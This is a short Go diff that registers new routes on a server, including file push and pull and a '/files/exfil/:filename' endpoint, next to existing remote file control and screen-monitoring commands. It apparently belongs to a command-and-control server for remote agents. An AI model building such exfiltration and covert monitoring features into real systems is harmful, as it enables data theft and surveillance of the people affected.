@@ -164,11 +164,14 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 
 		agentCmd.POST("/download", s.handleDownload)
 		agentCmd.POST("/upload", s.handleUploadFile)
+		agentCmd.POST("/files/push", s.handleUploadFile)
 
 		agentCmd.POST("/files/ls", s.handleListDir)
 		agentCmd.POST("/files/delete", s.handleFileDelete)
 		agentCmd.POST("/files/read", s.handleFileRead)
 		agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)
+		agentCmd.POST("/files/pull", s.handleFileUploadFromAgent)
+		agentCmd.GET("/files/exfil/:filename", s.handleFileExfilGet)
 
 		agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
 		agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)
